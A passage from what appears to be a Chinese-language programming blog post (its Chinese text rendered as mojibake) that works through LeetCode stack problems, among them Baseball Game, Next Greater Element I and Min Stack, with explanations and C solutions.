<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(top == <span class="number">-1</span>||s[top]!=<span class="string">&#x27;&#123;&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            top--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(top!=<span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/06/FlLegrRbnudxics.png" alt="image.png"></p><blockquote><p>å…¶å®å·®çš„ä¹Ÿä¸å¤šå˜›â€¦</p></blockquote><h2 id="0x01-æ£’çƒæ¯”èµ›"><a href="#0x01-æ£’çƒæ¯”èµ›" class="headerlink" title="0x01.æ£’çƒæ¯”èµ›"></a>0x01.<a href="https://leetcode-cn.com/problems/baseball-game">æ£’çƒæ¯”èµ›</a></h2><blockquote><p>ä½ ç°åœ¨æ˜¯æ£’çƒæ¯”èµ›è®°å½•å‘˜ã€‚<br>ç»™å®šä¸€ä¸ªå­—ç¬¦ä¸²åˆ—è¡¨ï¼Œæ¯ä¸ªå­—ç¬¦ä¸²å¯ä»¥æ˜¯ä»¥ä¸‹å››ç§ç±»å‹ä¹‹ä¸€ï¼š</p><p>1.æ•´æ•°ï¼ˆä¸€è½®çš„å¾—åˆ†ï¼‰ï¼šç›´æ¥è¡¨ç¤ºæ‚¨åœ¨æœ¬è½®ä¸­è·å¾—çš„ç§¯åˆ†æ•°ã€‚</p><ol start="2"><li>â€œ+â€ï¼ˆä¸€è½®çš„å¾—åˆ†ï¼‰ï¼šè¡¨ç¤ºæœ¬è½®è·å¾—çš„å¾—åˆ†æ˜¯å‰ä¸¤è½®æœ‰æ•ˆ å›åˆå¾—åˆ†çš„æ€»å’Œã€‚</li><li>â€œDâ€ï¼ˆä¸€è½®çš„å¾—åˆ†ï¼‰ï¼šè¡¨ç¤ºæœ¬è½®è·å¾—çš„å¾—åˆ†æ˜¯å‰ä¸€è½®æœ‰æ•ˆ å›åˆå¾—åˆ†çš„ä¸¤å€ã€‚</li><li>â€œCâ€ï¼ˆä¸€ä¸ªæ“ä½œï¼Œè¿™ä¸æ˜¯ä¸€ä¸ªå›åˆçš„åˆ†æ•°ï¼‰ï¼šè¡¨ç¤ºæ‚¨è·å¾—çš„æœ€åä¸€ä¸ªæœ‰æ•ˆ å›åˆçš„åˆ†æ•°æ˜¯æ— æ•ˆçš„ï¼Œåº”è¯¥è¢«ç§»é™¤ã€‚</li></ol><p>æ¯ä¸€è½®çš„æ“ä½œéƒ½æ˜¯æ°¸ä¹…æ€§çš„ï¼Œå¯èƒ½ä¼šå¯¹å‰ä¸€è½®å’Œåä¸€è½®äº§ç”Ÿå½±å“ã€‚<br>ä½ éœ€è¦è¿”å›ä½ åœ¨æ‰€æœ‰å›åˆä¸­å¾—åˆ†çš„æ€»å’Œã€‚</p><p>ç¤ºä¾‹ 1:</p><p>è¾“å…¥: [â€œ5â€,â€2â€,â€Câ€,â€Dâ€,â€+â€]<br>è¾“å‡º: 30<br>è§£é‡Š:<br>ç¬¬1è½®ï¼šä½ å¯ä»¥å¾—åˆ°5åˆ†ã€‚æ€»å’Œæ˜¯ï¼š5ã€‚<br>ç¬¬2è½®ï¼šä½ å¯ä»¥å¾—åˆ°2åˆ†ã€‚æ€»å’Œæ˜¯ï¼š7ã€‚<br>æ“ä½œ1ï¼šç¬¬2è½®çš„æ•°æ®æ— æ•ˆã€‚æ€»å’Œæ˜¯ï¼š5ã€‚<br>ç¬¬3è½®ï¼šä½ å¯ä»¥å¾—åˆ°10åˆ†ï¼ˆç¬¬2è½®çš„æ•°æ®å·²è¢«åˆ é™¤ï¼‰ã€‚æ€»æ•°æ˜¯ï¼š15ã€‚<br>ç¬¬4è½®ï¼šä½ å¯ä»¥å¾—åˆ°5 + 10 &#x3D; 15åˆ†ã€‚æ€»æ•°æ˜¯ï¼š30ã€‚<br>ç¤ºä¾‹ 2:</p><p>è¾“å…¥: [â€œ5â€,â€-2â€,â€4â€,â€Câ€,â€Dâ€,â€9â€,â€+â€,â€+â€]<br>è¾“å‡º: 27<br>è§£é‡Š:<br>ç¬¬1è½®ï¼šä½ å¯ä»¥å¾—åˆ°5åˆ†ã€‚æ€»å’Œæ˜¯ï¼š5ã€‚<br>ç¬¬2è½®ï¼šä½ å¯ä»¥å¾—åˆ°-2åˆ†ã€‚æ€»æ•°æ˜¯ï¼š3ã€‚<br>ç¬¬3è½®ï¼šä½ å¯ä»¥å¾—åˆ°4åˆ†ã€‚æ€»å’Œæ˜¯ï¼š7ã€‚<br>æ“ä½œ1ï¼šç¬¬3è½®çš„æ•°æ®æ— æ•ˆã€‚æ€»æ•°æ˜¯ï¼š3ã€‚<br>ç¬¬4è½®ï¼šä½ å¯ä»¥å¾—åˆ°-4åˆ†ï¼ˆç¬¬ä¸‰è½®çš„æ•°æ®å·²è¢«åˆ é™¤ï¼‰ã€‚æ€»å’Œæ˜¯ï¼š-1ã€‚<br>ç¬¬5è½®ï¼šä½ å¯ä»¥å¾—åˆ°9åˆ†ã€‚æ€»æ•°æ˜¯ï¼š8ã€‚<br>ç¬¬6è½®ï¼šä½ å¯ä»¥å¾—åˆ°-4 + 9 &#x3D; 5åˆ†ã€‚æ€»æ•°æ˜¯13ã€‚<br>ç¬¬7è½®ï¼šä½ å¯ä»¥å¾—åˆ°9 + 5 &#x3D; 14åˆ†ã€‚æ€»æ•°æ˜¯27ã€‚<br>æ³¨æ„ï¼š</p><p>è¾“å…¥åˆ—è¡¨çš„å¤§å°å°†ä»‹äº1å’Œ1000ä¹‹é—´ã€‚<br>åˆ—è¡¨ä¸­çš„æ¯ä¸ªæ•´æ•°éƒ½å°†ä»‹äº-30000å’Œ30000ä¹‹é—´ã€‚</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/baseball-game">https://leetcode-cn.com/problems/baseball-game</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><p>è¿™æ˜¯ä¸€é“<strong>æ¥è‡ªäºã€Šå‰‘æŒ‡Offerã€‹çš„é¢˜ç›®</strong>ï¼ˆ<del>ç®€å•åˆ°åˆä¸­OIeréƒ½èƒ½åšçš„é¢˜ï¼Œè¯´å®è¯é¢è¯•çœŸçš„ä¼šè€ƒè¿™ç§ä¸œè¥¿ğŸï¼Œæˆ‘æš‚ä¸”è’™åœ¨å¤é‡Œ</del></p><p>æ±‚è§£çš„ç®—æ³•å…¶å®ä¹Ÿå¾ˆç®€å•ï¼š</p><ul><li><strong>é‡åˆ°æ•´æ•°ï¼šå…¥æ ˆ</strong></li><li><strong>é‡åˆ°æ“ä½œæ•°â€œ+â€ï¼šå–æ ˆé¡¶å…ƒç´ çš„å€¼ä¸ä½äºæ ˆé¡¶å…ƒç´ ä¸‹æ–¹çš„å…ƒç´ çš„å€¼ï¼Œç›¸åŠ å¾—åˆ°ç¬¬ä¸‰ä¸ªå…ƒç´ ï¼Œç¬¬ä¸‰ä¸ªå…ƒç´ å…¥æ ˆ</strong></li><li><strong>é‡åˆ°æ“ä½œæ•°â€œDâ€ï¼šå–æ ˆé¡¶å…ƒç´ çš„å€¼*2ï¼Œå¾—åˆ°æ–°å…ƒç´ ï¼Œæ–°å…ƒç´ å…¥æ ˆ</strong></li><li><strong>é‡åˆ°æ“ä½œæ•°â€œCâ€ï¼šæ ˆé¡¶å…ƒç´ å‡ºæ ˆ</strong></li></ul><p>ï¼ˆè¯´å®è¯æˆ‘æ„Ÿè§‰æœ‰ç‚¹åƒæ±‚è§£å‰ç¼€&#x2F;åç¼€è¡¨è¾¾å¼çš„è§£æ³•XD</p><p>å› ä¸ºæ“ä½œæ•°æ•°é‡æ˜¯å·²çŸ¥çš„ï¼Œæ•…æˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨æ•°ç»„æ¨¡æ‹Ÿæ ˆï¼Œæ„é€ ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">calPoints</span><span class="params">(<span class="type">char</span> ** ops, <span class="type">int</span> opsSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> top = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> stack[opsSize+<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;opsSize;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(ops[i],<span class="string">&quot;+&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            top++;</span><br><span class="line">            stack[top] = stack[top<span class="number">-1</span>]+stack[top<span class="number">-2</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(ops[i],<span class="string">&quot;D&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            top++;</span><br><span class="line">            stack[top] = stack[top<span class="number">-1</span>]*<span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(ops[i],<span class="string">&quot;C&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            top--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            top++;</span><br><span class="line">            stack[top] = <span class="built_in">atoi</span>(ops[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=top;i++)</span><br><span class="line">        result+=stack[i];</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/06/s4P1GCldLaNikYQ.png" alt="image.png"></p><h2 id="0x02-ä¸‹ä¸€ä¸ªæ›´å¤§å…ƒç´ -I"><a href="#0x02-ä¸‹ä¸€ä¸ªæ›´å¤§å…ƒç´ -I" class="headerlink" title="0x02.ä¸‹ä¸€ä¸ªæ›´å¤§å…ƒç´  I"></a>0x02.<a href="https://leetcode-cn.com/problems/next-greater-element-i">ä¸‹ä¸€ä¸ªæ›´å¤§å…ƒç´  I</a></h2><blockquote><p>ç»™å®šä¸¤ä¸ª æ²¡æœ‰é‡å¤å…ƒç´  çš„æ•°ç»„ nums1 å’Œ nums2 ï¼Œå…¶ä¸­nums1 æ˜¯ nums2 çš„å­é›†ã€‚æ‰¾åˆ° nums1 ä¸­æ¯ä¸ªå…ƒç´ åœ¨ nums2 ä¸­çš„ä¸‹ä¸€ä¸ªæ¯”å…¶å¤§çš„å€¼ã€‚</p><p>nums1 ä¸­æ•°å­— x çš„ä¸‹ä¸€ä¸ªæ›´å¤§å…ƒç´ æ˜¯æŒ‡ x åœ¨ nums2 ä¸­å¯¹åº”ä½ç½®çš„å³è¾¹çš„ç¬¬ä¸€ä¸ªæ¯” x å¤§çš„å…ƒç´ ã€‚å¦‚æœä¸å­˜åœ¨ï¼Œå¯¹åº”ä½ç½®è¾“å‡º -1 ã€‚</p><p>ç¤ºä¾‹ 1:</p><p>è¾“å…¥: nums1 &#x3D; [4,1,2], nums2 &#x3D; [1,3,4,2].<br>è¾“å‡º: [-1,3,-1]<br>è§£é‡Š:<br>    å¯¹äºnum1ä¸­çš„æ•°å­—4ï¼Œä½ æ— æ³•åœ¨ç¬¬äºŒä¸ªæ•°ç»„ä¸­æ‰¾åˆ°ä¸‹ä¸€ä¸ªæ›´å¤§çš„æ•°å­—ï¼Œå› æ­¤è¾“å‡º -1ã€‚<br>    å¯¹äºnum1ä¸­çš„æ•°å­—1ï¼Œç¬¬äºŒä¸ªæ•°ç»„ä¸­æ•°å­—1å³è¾¹çš„ä¸‹ä¸€ä¸ªè¾ƒå¤§æ•°å­—æ˜¯ 3ã€‚<br>    å¯¹äºnum1ä¸­çš„æ•°å­—2ï¼Œç¬¬äºŒä¸ªæ•°ç»„ä¸­æ²¡æœ‰ä¸‹ä¸€ä¸ªæ›´å¤§çš„æ•°å­—ï¼Œå› æ­¤è¾“å‡º -1ã€‚<br>ç¤ºä¾‹ 2:</p><p>è¾“å…¥: nums1 &#x3D; [2,4], nums2 &#x3D; [1,2,3,4].<br>è¾“å‡º: [3,-1]<br>è§£é‡Š:<br>    å¯¹äº num1 ä¸­çš„æ•°å­— 2 ï¼Œç¬¬äºŒä¸ªæ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªè¾ƒå¤§æ•°å­—æ˜¯ 3 ã€‚<br>    å¯¹äº num1 ä¸­çš„æ•°å­— 4 ï¼Œç¬¬äºŒä¸ªæ•°ç»„ä¸­æ²¡æœ‰ä¸‹ä¸€ä¸ªæ›´å¤§çš„æ•°å­—ï¼Œå› æ­¤è¾“å‡º -1 ã€‚</p><p>æç¤ºï¼š</p><p>nums1å’Œnums2ä¸­æ‰€æœ‰å…ƒç´ æ˜¯å”¯ä¸€çš„ã€‚<br>nums1å’Œnums2 çš„æ•°ç»„å¤§å°éƒ½ä¸è¶…è¿‡1000ã€‚</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/next-greater-element-i">https://leetcode-cn.com/problems/next-greater-element-i</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><p>num1æ˜¯num2çš„å­é›†ï¼Œæˆ‘ä»¬å¾ˆå®¹æ˜“æƒ³åˆ°ï¼šå¯ä»¥å…ˆåœ¨num2ä¸­å¯¹äºæ¯ä¸€ä¸ªå…ƒç´ æ„é€ ä¸€ä¸ªæ˜ å°„ï¼ˆå“ˆå¸Œè¡¨ï¼‰ï¼Œåœ¨éå†num1æ—¶åªéœ€è¦ä½¿ç”¨è¿™ä¸ªæ˜ å°„è¡¨å³å¯</p><p>ä¸ºäº†é¿å…é‡å¤éå†ï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©ä½¿ç”¨ä¸€ä¸ª<strong>å•è°ƒæ ˆ</strong>æ¥çŸ­æš‚å‚¨å­˜éå†ä¸­çš„å…ƒç´ ï¼Œç®—æ³•å¦‚ä¸‹ï¼š</p><ul><li><strong>ä»»æ„å…ƒç´ å…¥æ ˆ</strong></li><li><strong>é‡åˆ°æ¯”æ ˆé¡¶å…ƒç´ å°çš„å…ƒç´ â€”â€”å…¥æ ˆ</strong></li><li><strong>é‡åˆ°æ¯”æ ˆé¡¶å…ƒç´ å¤§çš„å…ƒç´ â€”â€”æ ˆå†…å…ƒç´ é€ä¸€å‡ºæ ˆå¹¶æ„é€ æ˜ å°„ï¼Œç›´åˆ°æ ˆç©ºæˆ–æ ˆé¡¶å…ƒç´ å¤§äºæ‰€éå†å…ƒç´ ï¼Œæ­¤æ—¶è¯¥å…ƒç´ å…¥æ ˆ</strong></li><li><strong>éå†ç»“æŸï¼Œæ ˆå†…æ‰€æœ‰å…ƒç´ å‡ºæ ˆå¹¶ä¸-1æ„é€ æ˜ å°„</strong></li></ul><p>å¤§å°å¯çŸ¥ï¼Œè¿˜æ˜¯é€‰æ‹©ç®€å•çš„æ•°ç»„æ¨¡æ‹Ÿæ ˆï¼Œæ„é€ ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note: The returned array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span>* <span class="title">nextGreaterElement</span><span class="params">(<span class="type">int</span>* nums1, <span class="type">int</span> nums1Size, <span class="type">int</span>* nums2, <span class="type">int</span> nums2Size, <span class="type">int</span>* returnSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> table[nums2Size+<span class="number">5</span>];</span><br><span class="line">    <span class="type">int</span> stack[nums2Size+<span class="number">5</span>];</span><br><span class="line">    <span class="type">int</span> top = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums2Size;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(top == <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            top++;</span><br><span class="line">            stack[top] = i;<span class="comment">//save the index instead of value</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> _top=top;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;=_top;j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(nums2[i]&gt;nums2[stack[top]])</span><br><span class="line">                &#123;</span><br><span class="line">                    table[stack[top]] = nums2[i];</span><br><span class="line">                    top--;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            top++;</span><br><span class="line">            stack[top] = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(top!=<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        table[stack[top]] = <span class="number">-1</span>;</span><br><span class="line">        top--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> *arr = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(<span class="type">int</span>)*nums1Size);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums1Size;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> index=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(nums2[index]!=nums1[i])index++;</span><br><span class="line">        arr[i]=table[index];</span><br><span class="line">    &#125;</span><br><span class="line">    *returnSize = nums1Size;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°è¿è¡Œæ—¶é—´ä¸Šä¸æ˜¯é‚£ä¹ˆçš„ç†æƒ³ï¼Œå› ä¸ºæˆ‘ä»¬åœ¨æœ€åå»ºç«‹Nums1çš„æ˜ å°„æ—¶å¤šæ¬¡é‡å¤éå†ï¼Œæ—¶é—´å¤æ‚åº¦ç›´æ¥æå‡åˆ°O(N^2)</p><p><img src="https://i.loli.net/2020/09/06/JKROlSiaUjCfEFY.png" alt="image.png"></p><p>ä¸ºäº†é¿å…é‡å¤éå†ï¼Œæˆ‘ä»¬ç›´æ¥é€‰æ‹©<strong>ä½¿ç”¨æ•°ç»„çš„å€¼ä½œä¸ºæ˜ å°„è¡¨çš„ä¸‹æ ‡</strong>æ„é€ æ˜ å°„è¡¨æ•°ç»„è¿›è¡Œå–å€¼ï¼Œæ„é€ ä»£ç å¦‚ä¸‹</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note: The returned array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span>* <span class="title">nextGreaterElement</span><span class="params">(<span class="type">int</span>* nums1, <span class="type">int</span> nums1Size, <span class="type">int</span>* nums2, <span class="type">int</span> nums2Size, <span class="type">int</span>* returnSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> max=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums2Size;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        max = <span class="built_in">abs</span>(nums2[i])&gt;max?<span class="built_in">abs</span>(nums2[i]):max;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> table[<span class="number">2</span>*max+<span class="number">5</span>];</span><br><span class="line">    <span class="type">int</span> stack[nums2Size+<span class="number">5</span>];</span><br><span class="line">    <span class="type">int</span> top = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums2Size;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(top!=<span class="number">-1</span>&amp;&amp;stack[top]&lt;nums2[i])</span><br><span class="line">        &#123;</span><br><span class="line">            table[max+stack[top]] = nums2[i];</span><br><span class="line">            top--;</span><br><span class="line">        &#125;</span><br><span class="line">        top++;</span><br><span class="line">        stack[top] = nums2[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(top!=<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        table[stack[top]+max] = <span class="number">-1</span>;</span><br><span class="line">        top--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> *arr = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(<span class="type">int</span>)*nums1Size);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums1Size;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        arr[i]=table[nums1[i]+max];</span><br><span class="line">    &#125;</span><br><span class="line">    *returnSize = nums1Size;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“ç„¶ï¼Œç”±äºæˆ‘ä»¬æ‰€ä½¿ç”¨çš„æ˜ å°„è¡¨çš„å¤§å°å–çš„æ˜¯å…ƒç´ ä¸­ç»å¯¹å€¼æœ€å¤§çš„é‚£ä¸€ä¸ªä½œä¸ºå¤§å°ï¼Œæ‰€ä»¥å†…å­˜ä¸Šä¼šå¾ˆåƒäºï¼Œ<strong>å¯¹äºæ•°å€¼æ¯”è¾ƒå¤§çš„æ•°æ®è¿˜æ˜¯é€‰æ‹©æœ€åˆçš„è§£æ³•</strong></p><p><img src="https://i.loli.net/2020/09/06/gqZYICv2Uj6TLwA.png" alt="image.png"></p><h2 id="0x03-æ ˆçš„æœ€å°å€¼"><a href="#0x03-æ ˆçš„æœ€å°å€¼" class="headerlink" title="0x03.æ ˆçš„æœ€å°å€¼"></a>0x03.<a href="https://leetcode-cn.com/problems/min-stack-lcci">æ ˆçš„æœ€å°å€¼</a></h2><blockquote><p>è¯·è®¾è®¡ä¸€ä¸ªæ ˆï¼Œé™¤äº†å¸¸è§„æ ˆæ”¯æŒçš„popä¸pushå‡½æ•°ä»¥å¤–ï¼Œè¿˜æ”¯æŒminå‡½æ•°ï¼Œè¯¥å‡½æ•°è¿”å›æ ˆå…ƒç´ ä¸­çš„æœ€å°å€¼ã€‚æ‰§è¡Œpushã€popå’Œminæ“ä½œçš„æ—¶é—´å¤æ‚åº¦å¿…é¡»ä¸ºO(1)ã€‚</p><p>ç¤ºä¾‹ï¼š</p><p>MinStack minStack &#x3D; new MinStack();<br>minStack.push(-2);<br>minStack.push(0);<br>minStack.push(-3);<br>minStack.getMin();   â€“&gt; è¿”å› -3.<br>minStack.pop();<br>minStack.top();      â€“&gt; è¿”å› 0.<br>minStack.getMin();   â€“&gt; è¿”å› -2.</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/min-stack-lcci">https://leetcode-cn.com/problems/min-stack-lcci</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><p>å¤§æ¡†æ¶éƒ½ç»™å‡ºæ¥äº†ï¼Œå››èˆäº”å…¥ç›¸å½“äºæ¨¡æ¿é¢˜</p><p>è€é“¾è¡¨äººç›´æ¥æ„é€ ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">Stack</span>&#123;</span><br><span class="line">    <span class="type">int</span> value;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Stack</span> * next;</span><br><span class="line">&#125; MinStack;</span><br><span class="line"></span><br><span class="line"><span 